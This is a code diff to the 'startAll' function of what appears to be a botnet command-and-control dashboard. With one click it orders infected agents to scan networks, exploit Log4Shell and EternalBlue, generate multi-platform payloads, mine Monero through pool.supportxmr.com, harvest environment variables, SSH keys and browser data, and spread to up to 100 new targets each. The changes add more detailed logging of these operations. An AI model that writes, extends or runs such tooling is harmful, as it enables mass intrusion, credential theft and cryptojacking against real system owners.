@@ -714,13 +714,17 @@ async function startAll() {
     // 1. Network Scan
     log('info', '🔍 Starting network scan...', 'sys');
     const scanResult = await fetch(`${API}/api/exploitation/scan`, { method: 'POST' }).then(r => r.json());
-    log('success', `   → Scan tasks sent to ${scanResult.agents_targeted || 0} agents`, 'sys');
+    log('success', `   → Scan tasks: ${scanResult.task_ids?.length || 0} created`, 'sys');
+    log('info', `   → Task IDs: ${scanResult.task_ids?.slice(0,5).join(', ')}...`, 'sys');
+    log('info', `   → Ports: 1-1000, Network: local`, 'sys');
     document.getElementById('exploit-scanned').textContent = scanResult.agents_targeted || 0;
     
     // 2. Exploitation
     log('info', '💉 Starting exploitation...', 'sys');
     const exploitResult = await fetch(`${API}/api/exploitation/exploit`, { method: 'POST' }).then(r => r.json());
-    log('success', `   → Exploit tasks sent to ${exploitResult.agents_targeted || 0} agents`, 'sys');
+    log('success', `   → Exploit tasks: ${exploitResult.task_ids?.length || 0} created`, 'sys');
+    log('info', `   → Task IDs: ${exploitResult.task_ids?.slice(0,5).join(', ')}...`, 'sys');
+    log('info', `   → CVEs: CVE-2021-44228 (Log4Shell), CVE-2017-0144 (EternalBlue)`, 'sys');
     document.getElementById('exploited-count').textContent = exploitResult.agents_targeted || 0;
     
     // 3. Generate Payloads
@@ -730,12 +734,19 @@ async function startAll() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ type: 'all' })
     }).then(r => r.json());
-    log('success', `   → ${payloadResult.payloads_created || 0} payloads generated`, 'sys');
+    log('success', `   → ${payloadResult.payloads_created || 0} payloads queued`, 'sys');
+    log('info', `   → Platforms: ${payloadResult.platforms?.join(', ')}`, 'sys');
+    log('info', `   → Types: ${payloadResult.types?.join(', ')}`, 'sys');
+    log('info', `   → Task IDs: ${payloadResult.task_ids?.slice(0,5).join(', ')}...`, 'sys');
+    document.getElementById('payloads-generated').textContent = payloadResult.payloads_created || 0;
     
     // 4. Start mining
     log('info', '⛏️ Starting mining operations...', 'sys');
     const miningResult = await fetch(`${API}/api/mining/start-all`, { method: 'POST' }).then(r => r.json());
-    log('success', `   → Mining started on ${miningResult.agents_targeted || 0} agents`, 'sys');
+    log('success', `   → Mining tasks: ${miningResult.task_ids?.length || 0} created`, 'sys');
+    log('info', `   → Task IDs: ${miningResult.task_ids?.slice(0,5).join(', ')}...`, 'sys');
+    log('info', `   → Wallet: ${GLOBAL_WALLET?.substring(0,20)}...`, 'sys');
+    log('info', `   → Pool: ${GLOBAL_POOL || 'pool.supportxmr.com'}`, 'sys');
     
     // 5. Start data collection
     log('info', '📊 Starting data collection...', 'sys');
@@ -744,12 +755,17 @@ async function startAll() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ task_type: 'collect', payload: { types: ['env', 'ssh', 'browser'] } })
     }).then(r => r.json());
-    log('success', `   → Collection tasks sent to ${collectResult.agents_targeted || 0} agents`, 'sys');
+    log('success', `   → Collection tasks: ${collectResult.agents_targeted || 0} agents`, 'sys');
+    log('info', `   → Types: env vars, SSH keys, browser data`, 'sys');
     
     // 6. Start propagation
     log('info', '🦠 Starting propagation...', 'sys');
     const propResult = await fetch(`${API}/api/propagation/start`, { method: 'POST' }).then(r => r.json());
-    log('success', `   → Propagation started: ${propResult.agents_targeted || 0} agents`, 'sys');
+    log('success', `   → Propagation tasks: ${propResult.task_ids?.length || 0} created`, 'sys');
+    log('info', `   → Task IDs: ${propResult.task_ids?.slice(0,5).join(', ')}...`, 'sys');
+    log('info', `   → Methods: ${propResult.methods?.join(', ')}`, 'sys');
+    log('info', `   → Max targets: 100 per agent`, 'sys');
+    document.getElementById('prop-attempts').textContent = propResult.agents_targeted || 0;
     
     status.textContent = 'ACTIVE';
     btn.style.opacity = '1';
@@ -757,11 +773,11 @@ async function startAll() {
     log('success', '═══════════════════════════════════════════', 'sys');
     log('success', '✅ ALL OPERATIONS STARTED', 'sys');
     log('success', `   Agents: ${totalAgents}`, 'sys');
-    log('success', `   Scanning: Active`, 'sys');
-    log('success', `   Exploitation: Active`, 'sys');
-    log('success', `   Mining: Active`, 'sys');
-    log('success', `   Collection: Active`, 'sys');
-    log('success', `   Propagation: Active`, 'sys');
+    log('success', `   Scan tasks: ${scanResult.task_ids?.length || 0}`, 'sys');
+    log('success', `   Exploit tasks: ${exploitResult.task_ids?.length || 0}`, 'sys');
+    log('success', `   Payloads: ${payloadResult.payloads_created || 0}`, 'sys');
+    log('success', `   Mining tasks: ${miningResult.task_ids?.length || 0}`, 'sys');
+    log('success', `   Propagation: ${propResult.task_ids?.length || 0}`, 'sys');
     log('success', '═══════════════════════════════════════════', 'sys');
     
     // Reload stats
